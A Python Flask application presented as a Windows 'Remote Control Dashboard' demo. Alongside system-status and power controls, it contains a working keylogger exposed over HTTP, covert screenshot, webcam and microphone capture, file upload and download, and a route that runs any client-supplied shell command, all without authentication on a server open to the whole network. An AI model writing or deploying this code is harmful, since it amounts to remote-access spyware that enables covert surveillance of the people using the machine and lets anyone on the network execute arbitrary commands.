# app.py
"""
Remote Control Dashboard  (Windows‑only demo)
===========================================

Run **as Administrator** if you need low‑level features.  Provides:  
- System status (CPU, RAM %, GPU °C, battery, ping, disk)  
- Live CPU/RAM graphs (Chart.js)  
- Screenshot, webcam snapshot, 5‑sec mic recording  
- Keylogger (start/stop, view last 1000 keystrokes)  
- Process list / kill / launch  
- File browser (download / upload) rooted at user home  
- Power actions: lock, restart, shutdown, sleep, hibernate  
- Brightness & volume sliders (pycaw, WMI)  

Install deps →  
```bash
pip install flask psutil pillow pynput opencv-python sounddevice soundfile GPUtil wmi pycaw comtypes
```
Then:  
```bash
python app.py
# → browse http://localhost:5000
```
"""

from __future__ import annotations
import io, ctypes, subprocess, re, threading, json, os
from datetime import datetime
from pathlib import Path
from typing import Dict, Any

from flask import Flask, jsonify, Response, request, send_file, abort
import psutil
from PIL import ImageGrab
from pynput import keyboard

# Optional heavy deps (wrap to allow running without them)
try:
    import cv2
except ImportError:
    cv2 = None
try:
    import sounddevice as sd, soundfile as sf
except ImportError:
    sd = sf = None
try:
    import GPUtil
except ImportError:
    GPUtil = None
try:
    import wmi  # for brightness on laptops
except ImportError:
    wmi = None

# Volume via pycaw
try:
    from ctypes import POINTER, cast
    from comtypes import CLSCTX_ALL
    from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
except ImportError:
    AudioUtilities = IAudioEndpointVolume = None  # type: ignore

app = Flask(__name__)

################################################################################
# Utility helpers
################################################################################

def ping_time(host: str = "8.8.8.8") -> int | None:
    """Return average ping time in ms (Windows)."""
    try:
        out = subprocess.check_output(["ping", "-n", "1", host], text=True, timeout=5)
        m = re.search(r"Average = ([0-9]+)ms", out)
        return int(m.group(1)) if m else None
    except Exception:
        return None


def internet_up() -> bool:
    return ping_time() is not None


def is_locked() -> bool:
    user32 = ctypes.WinDLL("user32", use_last_error=True)
    DESKTOP_SWITCHDESKTOP = 0x0100
    hdesk = user32.OpenDesktopW("Default", 0, False, DESKTOP_SWITCHDESKTOP)
    if not hdesk:
        return False
    locked = not bool(user32.SwitchDesktop(hdesk))
    user32.CloseDesktop(hdesk)
    return locked


def gpu_temp() -> int | None:
    if not GPUtil:
        return None
    try:
        gpus = GPUtil.getGPUs()
        return gpus[0].temperature if gpus else None
    except Exception:
        return None

################################################################################
# Keylogger implementation
################################################################################

_keylog_buf: list[str] = []
_keylog_running = False
_listener: keyboard.Listener | None = None
_log_lock = threading.Lock()


def _on_key_press(key):
    with _log_lock:
        _keylog_buf.append(f"{datetime.now():%Y-%m-%d %H:%M:%S}: {key}")


def start_keylogger():
    global _listener, _keylog_running
    if _keylog_running:
        return
    _listener = keyboard.Listener(on_press=_on_key_press)
    _listener.start()
    _keylog_running = True


def stop_keylogger():
    global _listener, _keylog_running
    if _listener:
        _listener.stop()
    _keylog_running = False

################################################################################
# Brightness / Volume helpers
################################################################################

def get_brightness() -> int | None:
    if not wmi:
        return None
    return wmi.WMI(namespace="wmi").WmiMonitorBrightness()[0].CurrentBrightness


def set_brightness(level: int):
    if not wmi:
        raise RuntimeError("WMI not available")
    wmi.WMI(namespace="wmi").WmiMonitorBrightnessMethods()[0].WmiSetBrightness(level, 0)


def get_volume() -> int | None:
    if not AudioUtilities:
        return None
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)  # type: ignore
    vol = cast(interface, POINTER(IAudioEndpointVolume))
    return int(vol.GetMasterVolumeLevelScalar() * 100)


def set_volume(level: int):
    if not AudioUtilities:
        raise RuntimeError("pycaw not available")
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)  # type: ignore
    vol = cast(interface, POINTER(IAudioEndpointVolume))
    vol.SetMasterVolumeLevelScalar(level / 100, None)

################################################################################
# Flask routes
################################################################################

@app.route("/")
def root():
    return Response(INDEX_HTML, mimetype="text/html")

# ————— STATUS —————
@app.route("/status")
def status():
    batt = psutil.sensors_battery()
    disks: Dict[str, Any] = {
        p.mountpoint: {
            "total": psutil.disk_usage(p.mountpoint).total,
            "used": psutil.disk_usage(p.mountpoint).used,
            "free": psutil.disk_usage(p.mountpoint).free,
        }
        for p in psutil.disk_partitions()
        if p.fstype
    }
    return jsonify(
        internet=internet_up(),
        locked=is_locked(),
        ping=ping_time(),
        gpu_temp=gpu_temp(),
        cpu=psutil.cpu_percent(interval=0.1),
        ram=psutil.virtual_memory().percent,
        battery=batt._asdict() if batt else None,
        disk=disks,
    )

# ————— POWER —————
@app.route("/action/<cmd>", methods=["POST"])
def power_action(cmd):
    mapping = {
        "lock": ["rundll32.exe", "user32.dll,LockWorkStation"],
        "restart": ["shutdown", "/r", "/t", "0"],
        "reboot": ["shutdown", "/r", "/t", "0"],
        "shutdown": ["shutdown", "/s", "/t", "0"],
        "sleep": ["rundll32.exe", "powrprof.dll,SetSuspendState", "0,1,0"],
        "hibernate": ["shutdown", "/h"],
    }
    if cmd not in mapping:
        return "bad", 400
    subprocess.Popen(mapping[cmd])
    return "", 204

# ————— BRIGHTNESS / VOLUME —————
@app.route("/brightness", methods=["GET", "POST"])
def brightness():
    if request.method == "POST":
        level = int(request.json["level"])
        set_brightness(level)
    current = get_brightness()
    return jsonify(level=current)

@app.route("/volume", methods=["GET", "POST"])
def volume():
    if request.method == "POST":
        level = int(request.json["level"])
        set_volume(level)
    current = get_volume()
    return jsonify(level=current)

# ————— SCREENSHOT / WEBCAM / MIC —————
@app.route("/screenshot")
def screenshot():
    img = ImageGrab.grab()
    buf = io.BytesIO()
    img.save(buf, format="PNG")
    buf.seek(0)
    return send_file(buf, mimetype="image/png", download_name="screenshot.png")

@app.route("/webcam")
def webcam():
    if not cv2:
        abort(501)
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    cam.release()
    if not ret:
        abort(500)
    _, buf = cv2.imencode(".jpg", frame)
    return send_file(io.BytesIO(buf.tobytes()), mimetype="image/jpeg")

@app.route("/mic")
def mic():
    if not sd:
        abort(501)
    dur = float(request.args.get("sec", 5))
    fs = 44100
    rec = sd.rec(int(dur * fs), samplerate=fs, channels=1)
    sd.wait()
    tmp = io.BytesIO()
    sf.write(tmp, rec, fs, format="WAV")
    tmp.seek(0)
    return send_file(tmp, mimetype="audio/wav", download_name=f"rec_{datetime.now():%Y%m%d_%H%M%S}.wav")

# ————— KEYLOGGER —————
@app.route("/keylogger/<cmd>", methods=["POST"])
def keylogger_ctrl(cmd):
    if cmd == "start":
        start_keylogger()
    elif cmd == "stop":
        stop_keylogger()
    else:
        abort(400)
    return "", 204

@app.route("/keylogs")
def keylogs():
    with _log_lock:
        return jsonify(logs=_keylog_buf[-1000:])

# ————— PROCESSES —————
@app.route("/processes")
def processes():
    procs = [
        {
            "pid": p.pid,
            "name": p.info["name"],
            "cpu": p.cpu_percent(None),
            "mem": p.memory_percent(),
        }
        for p in psutil.process_iter(["name"])
    ]
    return jsonify(procs)

@app.route("/process/<int:pid>/kill", methods=["POST"])
def kill_process(pid: int):
    try:
        psutil.Process(pid).kill()
        return "", 204
    except psutil.NoSuchProcess:
        abort(404)

@app.route("/process/launch", methods=["POST"])
def launch_process():
    cmd = request.json["cmd"]
    subprocess.Popen(cmd, shell=True)
    return "", 204

# ————— FILE BROWSER —————
ROOT = Path.home()

@app.route("/files")
def list_files():
    client_path = request.args.get("path", "")
    path = (ROOT / client_path).resolve()
    if ROOT not in path.parents and path != ROOT:
        abort(403)
    if not path.exists():
        abort(404)
    items = [
        {
            "name": p.name,
            "dir": p.is_dir(),
            "size": p.stat().st_size,
            "mtime": p.stat().st_mtime,
        }
        for p in path.iterdir()
    ]
    return jsonify(path=str(path.relative_to(ROOT)), items=items)

@app.route("/download")
def download():
    client_path = request.args.get("path", "")
    path = (ROOT / client_path).resolve()
    if ROOT not in path.parents and path != ROOT or not path.is_file():
        abort(403)
    return send_file(path, as_attachment=True)

@app.route("/upload", methods=["POST"])
def upload():
    client_path = request.form["path"]
    target = (ROOT / client_path).resolve()
    if ROOT not in target.parents and target != ROOT:
        abort(403)
    target.parent.mkdir(parents=True, exist_ok=True)
    file = request.files["file"]
    file.save(target)
    return "", 204

################################################################################
# Inline HTML / JS – Bootstrap + Chart.js
################################################################################

INDEX_HTML = r"""
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Remote Control Dashboard</title>
<link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.3/css/bootstrap.min.css" rel="stylesheet" />
<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.0/chart.umd.min.js"></script>
<style>
body{background:#f8f9fa}
.card{margin-bottom:1rem}
pre{white-space:pre-wrap;max-height:300px;overflow:auto}
</style>
</head>
<body>
<div class="container py-3">
<h1 class="mb-3">Remote Control Dashboard</h1>
<!-- Status -->
<div class="card">
<div class="card-header">Status</div>
<div class="card-body" id="statusBody">
Loading…
</div>
</div>
<!-- Charts -->
<canvas id="cpuChart" height="120"></canvas>
<canvas id="ramChart" height="120"></canvas>
<!-- Controls -->
<div class="card" id="controlsCard"></div>
<!-- Keylogger -->
<div class="card">
<div class="card-header d-flex justify-content-between">
<span>Keylogger</span>
<div>
<button class="btn btn-sm btn-outline-success" onclick="keylogStart()">Start</button>
<button class="btn btn-sm btn-outline-danger" onclick="keylogStop()">Stop</button>
</div>
</div>
<div class="card-body"><pre id="keylogs">—</pre></div>
</div>
<!-- Screenshot / webcam / mic results -->
<div class="row">
<div class="col-md-4"><img id="screenshotImg" class="img-fluid" alt="Screenshot"></div>
<div class="col-md-4"><img id="webcamImg" class="img-fluid" alt="Webcam"></div>
<div class="col-md-4"><audio id="micAudio" controls style="width:100%"></audio></div>
</div>
<!-- Process manager -->
<div class="card">
<div class="card-header d-flex justify-content-between">
<span>Processes</span>
<div>
<input type="text" id="launchCmd" placeholder="cmd.exe" class="form-control form-control-sm d-inline-block" style="width:150px">
<button class="btn btn-sm btn-secondary" onclick="launchProc()">Launch</button>
</div>
</div>
<div class="card-body"><table class="table table-sm" id="procTable"></table></div>
</div>
<!-- File browser -->
<div class="card">
<div class="card-header">Files <span id="curPath"></span></div>
<div class="card-body">
<table class="table table-sm" id="fileTable"></table>
<form id="uploadForm" class="mt-2" enctype="multipart/form-data">
<input type="file" name="file" class="form-control" required>
<input type="hidden" name="path" id="uploadPath">
<button class="btn btn-primary btn-sm mt-1">Upload</button>
</form>
</div>
</div>
</div>
<script>
let cpuData = {labels:[],datasets:[{label:"CPU %",data:[],tension:.3}]};
let ramData = {labels:[],datasets:[{label:"RAM %",data:[],tension:.3}]};
const cpuCtx = new Chart(document.getElementById('cpuChart'), {type:'line',data:cpuData});
const ramCtx = new Chart(document.getElementById('ramChart'), {type:'line',data:ramData});
let diskInfo = {};
async function fetchStatus(){
  const r=await fetch('/status');
  const s=await r.json();
  const t=new Date().toLocaleTimeString();
  if(cpuData.labels.length>30){cpuData.labels.shift();cpuData.datasets[0].data.shift();}
  cpuData.labels.push(t);cpuData.datasets[0].data.push(s.cpu);
  if(ramData.labels.length>30){ramData.labels.shift();ramData.datasets[0].data.shift();}
  ramData.labels.push(t);ramData.datasets[0].data.push(s.ram);
  cpuCtx.update();ramCtx.update();
  diskInfo=s.disk;
  document.getElementById('statusBody').innerHTML=`<b>Internet:</b> ${s.internet} ‑ ping ${s.ping||'n/a'} ms<br>
  <b>Locked:</b> ${s.locked}<br><b>CPU:</b> ${s.cpu}% | <b>RAM:</b> ${s.ram}%<br>
  <b>GPU Temp:</b> ${s.gpu_temp||'n/a'}°C<br><b>Battery:</b> ${s.battery? s.battery.percent+'% '+(s.battery.power_plugged?'⚡':'🔋'):'n/a'}<br>`;
}

function action(c){fetch('/action/'+c,{method:'POST'});}
function screenshot(){document.getElementById('screenshotImg').src='/screenshot?'+Date.now();}
function webcam(){document.getElementById('webcamImg').src='/webcam?'+Date.now();}
async function mic(){const a=document.getElementById('micAudio');a.src='';const r=await fetch('/mic');const b=await r.blob();a.src=URL.createObjectURL(b);a.play();}
async function keylogStart(){await fetch('/keylogger/start',{method:'POST'});}
async function keylogStop(){await fetch('/keylogger/stop',{method:'POST'});}
async function loadKeylogs(){const r=await fetch('/keylogs');const j=await r.json();document.getElementById('keylogs').textContent=j.logs.join('\n');}
async function loadProcs(){const r=await fetch('/processes');const p=await r.json();const tbl=document.getElementById('procTable');tbl.innerHTML='<tr><th>PID</th><th>Name</th><th>CPU</th><th>RAM</th><th></th></tr>'+p.map(x=>`<tr><td>${x.pid}</td><td>${x.name}</td><td>${x.cpu.toFixed(1)}</td><td>${x.mem.toFixed(1)}</td><td><button class='btn btn-danger btn-sm' onclick='kill(${x.pid})'>Kill</button></td></tr>`).join('');}
function kill(pid){fetch(`/process/${pid}/kill`,{method:'POST'}).then(loadProcs);} 
function launchProc(){const cmd=document.getElementById('launchCmd').value;fetch('/process/launch',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({cmd})}).then(loadProcs);}
// File browser
let curPath='';
async function listFiles(path=''){
  const r=await fetch('/files?path='+encodeURIComponent(path));if(!r.ok)return;const j=await r.json();curPath=j.path;document.getElementById('curPath').textContent=curPath||'/';document.getElementById('uploadPath').value=curPath+'/';
  const tbl=document.getElementById('fileTable');
  let rows='';if(curPath){rows+=`<tr><td colspan=4><button class='btn btn-sm btn-secondary' onclick="listFiles('${curPath.split('/').slice(0,-1).join('/')}')">⬆️ Up</button></td></tr>`;}
  rows+=j.items.map(it=>it.dir?`<tr><td>📁 <a href='#' onclick="listFiles('${(curPath+'/'+it.name).replace(/^[\/]/,'')}')">${it.name}</a></td><td>dir</td><td></td><td></td></tr>`:`<tr><td>📄 ${it.name}</td><td>${(it.size/1024).toFixed(1)} KB</td><td>${new Date(it.mtime*1000).toLocaleString()}</td><td><a class='btn btn-sm btn-outline-primary' href='/download?path=${encodeURIComponent(curPath+'/'+it.name)}'>Download</a></td></tr>`).join('');
  tbl.innerHTML='<tr><th>Name</th><th>Size</th><th>Modified</th><th></th></tr>'+rows;
}
document.getElementById('uploadForm').addEventListener('submit',async e=>{e.preventDefault();const fd=new FormData(e.target);await fetch('/upload',{method:'POST',body:fd});listFiles(curPath);});

// Controls card HTML
function renderControls(){document.getElementById('controlsCard').innerHTML=`<div class='card-header'>Controls</div><div class='card-body'>
<button class='btn btn-primary me-2' onclick="action('lock')">Lock</button>
<button class='btn btn-warning me-2' onclick="action('restart')">Restart</button>
<button class='btn btn-danger me-2' onclick="action('shutdown')">Shutdown</button>
<button class='btn btn-secondary me-2' onclick="action('sleep')">Sleep</button>
<button class='btn btn-secondary me-2' onclick="action('hibernate')">Hibernate</button>
<button class='btn btn-info me-2' onclick='screenshot()'>Screenshot</button>
<button class='btn btn-info me-2' onclick='webcam()'>Webcam</button>
<button class='btn btn-info' onclick='mic()'>Mic 5s</button>
<div class='mt-3'>Brightness: <input type='range' min='0' max='100' id='brightR'> <span id='brightVal'></span>%</div>
<div>Volume: <input type='range' min='0' max='100' id='volR'> <span id='volVal'></span>%</div>
</div>`;
  document.getElementById('brightR').addEventListener('input',e=>{document.getElementById('brightVal').textContent=e.target.value;fetch('/brightness',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({level:e.target.value})});});
  document.getElementById('volR').addEventListener('input',e=>{document.getElementById('volVal').textContent=e.target.value;fetch('/volume',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({level:e.target.value})});});
  // init values
  fetch('/brightness').then(r=>r.json()).then(j=>{if(j.level!=null){document.getElementById('brightR').value=j.level;document.getElementById('brightVal').textContent=j.level;}});
  fetch('/volume').then(r=>r.json()).then(j=>{if(j.level!=null){document.getElementById('volR').value=j.level;document.getElementById('volVal').textContent=j.level;}});
}
renderControls();
setInterval(fetchStatus,3000);fetchStatus();loadKeylogs();setInterval(loadKeylogs,5000);listFiles();loadProcs();setInterval(loadProcs,10000);
</script>
</body>
</html>
"""

################################################################################
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
